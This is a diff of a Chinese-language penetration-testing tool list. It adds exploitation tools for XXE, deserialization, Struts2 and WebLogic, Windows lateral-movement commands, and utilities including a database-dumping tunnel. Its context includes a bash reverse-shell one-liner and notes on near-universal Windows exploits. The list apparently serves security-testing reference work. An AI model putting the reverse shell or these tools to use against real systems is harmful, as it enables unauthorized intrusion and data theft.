@@ -92,8 +92,9 @@ wvs
 
 burpsuite
 
-nessus
- 
+nessus（强烈推荐）
+
+xray
 
 ### 爆破
 
@@ -123,6 +124,15 @@ burpsuite
 
 sqlmap
 
+xxer （xml注入利用工具） https://github.com/TheTwitchy/xxer 
+
+ysoserial （反序列化利用工具） https://github.com/frohoff/ysoserial
+
+Struts2-Scan （struts2历史漏洞扫描和利用） https://github.com/HatBoy/Struts2-Scan
+
+weblogicScanner （weblogic历史漏洞扫描利用） https://github.com/0xn0ne/weblogicScanner
+
+exphub （常见web框架cve利用） https://github.com/zhzyker/exphub
 
 ### webshell
 
@@ -134,9 +144,7 @@ sqlmap
 
 cobalt strike
 
-反弹shell
-
-普通shell
+普通反弹shell
 ```
 bash -i >& /dev/tcp/HOST/PORT 0>&1
 ```
@@ -254,6 +262,24 @@ FRP
 
 N2N
 
+### 内网命令执行和文件访问
+
+at
+
+schtasks
+
+telnet
+
+sc
+
+wmic
+
+wmiexec.vbs
+
+psexec
+
+远程桌面
+
 ### arp欺骗
 
 Cain
@@ -281,3 +307,18 @@ Dendroid
 ms17-010 基本通杀
 
 cve-2019-0708 开放3389情况 windows7及之前通杀
+
+
+### 实用工具
+
+q-dir 文件管理工具，可开四个窗口
+
+beyond compare 文件/文本比较工具
+
+cmder 命令行工具
+
+everything 文件搜索工具 
+
+navicat 数据库连接工具，支持超多种类数据库，支持导出数据，甚至提供拖库的tunnel.php等
+
+悬剑3.0 超齐全windows工具库系统
